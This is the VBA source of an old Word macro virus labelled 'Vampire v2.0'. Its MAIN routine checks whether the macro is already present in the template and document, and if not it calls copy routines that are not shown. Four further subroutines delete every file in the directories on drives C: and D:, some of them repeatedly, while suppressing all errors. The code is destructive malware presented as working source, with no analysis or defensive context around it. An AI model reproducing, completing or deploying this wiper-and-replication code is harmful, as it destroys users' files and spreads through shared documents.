   Attribute VB_Name = "Pire"

   Dim DT$, FNI$
   Rem Finish date:1997.07.04 (Vampire2.0)
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Vampire v2.0"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Pire.MAIN"
   Dim V1
   Dim i
   Dim CCH
   Dim V2
   Dim j
   Dim CHH
   DT$ = ""
   FNI$ = ""
   On Error Resume Next
   V1 = WordBasic.CountMacros(0)
   If V1 > 0 Then
     For i = 1 To V1
        If WordBasic.[MacroName$](i, 0) = "Pire" Then CCH = 1
     Next i
   End If
   If CCH <> 1 Then
   WordBasic.Call "BBB"
   End If

   V2 = WordBasic.CountMacros(1)
   If V2 > 0 Then
      For j = 1 To V2
          If WordBasic.[MacroName$](j, 1) = "Pire" Then CHH = 1
      Next j
   End If
   If CHH <> 1 Then
   WordBasic.Call "AAA"
   End If

   exit_:

   End Sub

   Private Sub VM()
   Dim CD
   Dim L
   Dim la$
   Dim lam$

   On Error Resume Next

   lamo:
   On Error Resume Next
   CD = WordBasic.CountDirectories("C:\")
   For L = 1 To CD
   la$ = "C:\" + WordBasic.[GetDirectory$]("C:\", L) + "\*.*"
   lam$ = WordBasic.[Files$]("C:\" + WordBasic.[GetDirectory$]("C:\", L) + "\*.*")
   If lam$ = "" Then GoTo NE
   WordBasic.Kill la$

   NE:
   Next L

   exit_:

   End Sub


   Private Sub VM1()
   Dim R
   Dim CD1
   Dim L
   Dim la$
   Dim lam$
   R = 0
   On Error Resume Next

   lamoa:
   CD1 = WordBasic.CountDirectories("C:\")
   For L = 1 To CD1
   la$ = "C:\" + WordBasic.[GetDirectory$]("C:\", L) + "\*.*"
   lam$ = WordBasic.[Files$]("C:\" + WordBasic.[GetDirectory$]("C:\", L) + "\*.*")
   If lam$ = "" Then GoTo NE
   WordBasic.Kill la$

   NE:
   Next L

   exit_:

   R = R + 1
   If R <= 7 Then GoTo lamoa

   End Sub

   Private Sub VM2()
   Dim CD2
   Dim L
   Dim la$
   Dim lam$
   On Error Resume Next
   lamob:
   On Error Resume Next
   CD2 = WordBasic.CountDirectories("D:\")
   For L = 1 To CD2
   la$ = "D:\" + WordBasic.[GetDirectory$]("D:\", L) + "\*.*"
   lam$ = WordBasic.[Files$]("C:\" + WordBasic.[GetDirectory$]("D:\", L) + "\*.*")
   If lam$ = "" Then GoTo NE
   WordBasic.Kill la$


   NE:
   Next L

   exit_:

   End Sub

   Private Sub VM3()
   Dim R
   Dim CD3
   Dim L
   Dim la$
   Dim lam$
   R = 0
   On Error Resume Next

   lamoc:
   CD3 = WordBasic.CountDirectories("D:\")
   For L = 1 To CD3
   la$ = "D:\" + WordBasic.[GetDirectory$]("D:\", L) + "\*.*"
   lam$ = WordBasic.[Files$]("D:\" + WordBasic.[GetDirectory$]("D:\", L) + "\*.*")
   If lam$ = "" Then GoTo NE
   WordBasic.Kill la$

   NE:
   Next L

   exit_:

   R = R + 1
   If R <= 7 Then GoTo lamoc

   End Sub
